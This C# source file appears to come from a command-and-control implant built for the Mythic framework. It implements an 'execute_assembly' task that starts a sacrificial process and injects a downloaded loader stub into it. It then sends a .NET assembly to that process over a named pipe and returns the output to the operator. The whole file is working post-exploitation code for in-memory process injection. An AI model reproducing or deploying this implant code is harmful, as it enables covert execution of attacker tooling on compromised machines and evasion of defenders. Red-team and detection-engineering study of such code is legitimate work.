#define COMMAND_NAME_UPPER

#if DEBUG
#define EXECUTE_ASSEMBLY
#endif

#if EXECUTE_ASSEMBLY

using System;
using System.Linq;
using System.Text;
using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using PhantomInterop.Serializers;
using System.Threading;
using System.Collections.Concurrent;
using System.IO.Pipes;
using PhantomInterop.Structs.PhantomStructs;
using PhantomInterop.Classes.Core;
using PhantomInterop.Classes.Collections;
using PhantomInterop.Utils;

namespace Tasks
{

    internal class ExecuteAssemblyException : Exception
    {
        public ExecuteAssemblyException()
        {
        }

        public ExecuteAssemblyException(string message) : base(message)
        {
        }

        public ExecuteAssemblyException(string message, Exception inner)
            : base (message, inner)
        {
        }
    }

    public class execute_assembly : Tasking
    {
        [DataContract]
        internal struct ExecuteAssemblyParameters
        {
            [DataMember(Name = "pipe_name")]
            public string PipeName;
            [DataMember(Name = "assembly_name")]
            public string AssemblyName;
            [DataMember(Name = "assembly_arguments")]
            public string AssemblyArguments;
            [DataMember(Name = "loader_stub_id")]
            public string LoaderStubId;
        }

        private AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
        private ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
        private JsonHandler _serializer = new JsonHandler();
        private AutoResetEvent _taskComplete = new AutoResetEvent(false);
        private Action<object> _transmitAction;

        private Action<object> _flushData;
        private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
        private bool _isFinished = false;
        private System.Threading.Tasks.Task flushTask;

        public execute_assembly(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {
            _transmitAction = (object p) =>
            {
                PipeStream ps = (PipeStream)p;
                while (ps.IsConnected && !_stopToken.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                    _msgSendEvent,
                    _stopToken.Token.WaitHandle
                    });
                    if (!_stopToken.IsCancellationRequested && ps.IsConnected && _msgSendQueue.TryDequeue(out byte[] result))
                    {
                        try
                        {
                            ps.BeginWrite(result, 0, result.Length, ProcessSentMessage, p);
                        }
                        catch
                        {
                            ps.Close();
                            _taskComplete.Set();
                            return;
                        }

                    } else if (!ps.IsConnected)
                    {
                        ps.Close();
                        _taskComplete.Set();
                        return;
                    }
                }
                ps.Close();
                _taskComplete.Set();
            };

            _flushData = (object p) =>
            {
                string output = "";
                while (!_stopToken.IsCancellationRequested && !_isFinished)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                        _taskComplete,
                        _stopToken.Token.WaitHandle
                    }, 2000);
                    output = string.Join("", _assemblyOutput.Flush());
                    if (!string.IsNullOrEmpty(output))
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(
                            CreateTaskResponse(
                                output,
                                false,
                                ""));
                    }
                }
                while (true)
                {
                    System.Threading.Tasks.Task.Delay(1000).Wait(); // wait 1s
                    output = string.Join("", _assemblyOutput.Flush());
                    if (!string.IsNullOrEmpty(output))
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(
                            CreateTaskResponse(
                                output,
                                false,
                                ""));
                    } else
                    {
                        DebugHelp.DebugWriteLine($"no longer collecting output");
                        return;
                    }
                }

            };
        }

        public override void Kill()
        {
            _isFinished = true;
            _taskComplete.Set();
            flushTask.Wait();
            _stopToken.Cancel();

        }

        public override void Start()
        {
            MythicTaskResponse resp;
            Process? proc = null;
            try
            {
                ExecuteAssemblyParameters parameters = _dataSerializer.Deserialize<ExecuteAssemblyParameters>(_data.Parameters);
                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                    string.IsNullOrEmpty(parameters.AssemblyName) ||
                    string.IsNullOrEmpty(parameters.PipeName))
                {
                    throw new ExecuteAssemblyException($"One or more required arguments was not provided.");
                }

                if (!_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
                {
                    throw new ExecuteAssemblyException($"'{parameters.AssemblyName}' is not loaded (have you registered it?");
                }

                if (!_agent.GetFileManager().GetFile(_stopToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
                {
                    throw new ExecuteAssemblyException($"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})");
                }

                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
                proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);

                try
                {
                    if (!proc.Start())
                    {
                        throw new ExecuteAssemblyException("process not started.");
                    }
                }
                catch (Exception e)
                {
                    throw new ExecuteAssemblyException($"Failed to start '{info.Application}' sacrificial process: {e.Message}");
                }

                _agent.GetTaskManager()
                    .AddTaskResponseToQueue(
                        CreateTaskResponse(
                            "",
                            false,
                            "",
                            new ICommandMessage[]
                            {
                                Artifact.ProcessCreate((int) proc.PID, info.Application, info.Arguments)
                            }
                        )
                    );

                if (!proc.Inject(exeAsmPic))
                {
                    throw new ExecuteAssemblyException($"Failed to inject assembly loader into sacrificial process {info.Application}.");
                }

                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                    "",
                    false,
                    "",
                    new ICommandMessage[]
                    {
                        Artifact.ProcessInject((int) proc.PID,
                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
                    }));

                IPCCommandArguments cmdargs = new IPCCommandArguments
                {
                    ByteData = assemblyBytes,
                    StringData = string.IsNullOrEmpty(parameters.AssemblyArguments)
                        ? ""
                        : parameters.AssemblyArguments,
                };

                AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                client.ConnectionEstablished += OnConnectionReady;
                client.MessageReceived += Client_MessageReceived;
                client.Disconnect += OnConnectionClosed;

                if (!client.Connect(10000))
                {
                    throw new ExecuteAssemblyException($"Injected assembly into sacrificial process: {info.Application}.\n Failed to connect to named pipe.");
                }

                DataChunk[] chunks = _serializer.SerializeIPCMessage(cmdargs);
                foreach (DataChunk chunk in chunks)
                {
                    _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
                }

                _msgSendEvent.Set();
                WaitHandle.WaitAny(new WaitHandle[]
                {
                    _stopToken.Token.WaitHandle
                });

                resp = CreateTaskResponse("", true, "completed");
            }
            catch (ExecuteAssemblyException ex)
            {
                resp = CreateTaskResponse($"Error executing assembly\n\n{ex.Message}", true, "error");
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
            }

            if (proc != null && !proc.HasExited)
            {
                proc.Kill();
                resp.Artifacts = [Artifact.ProcessKill((int)proc.PID)];
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }

        private void OnConnectionClosed(object sender, PipeMessageData e)
        {
            _isFinished = true;
            _taskComplete.Set();
            flushTask.Wait();
            e.Pipe.Close();
            _stopToken.Cancel();

        }

        private void OnConnectionReady(object sender, PipeMessageData e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_transmitAction, e.Pipe, _stopToken.Token);
            flushTask = System.Threading.Tasks.Task.Factory.StartNew(_flushData, _stopToken.Token);
        }

        public void ProcessSentMessage(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected && !_stopToken.IsCancellationRequested && _msgSendQueue.TryDequeue(out byte[] data))
            {
                try
                {
                    pipe.EndWrite(result);
                    pipe.BeginWrite(data, 0, data.Length, ProcessSentMessage, pipe);
                }
                catch
                {

                }

            }
        }

        private void Client_MessageReceived(object sender, PipeMessageData e)
        {
            IPCData d = e.Data;
            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
            DebugHelp.DebugWriteLine($"adding data to output");
            _assemblyOutput.Add(msg);
        }
    }
}
#endif
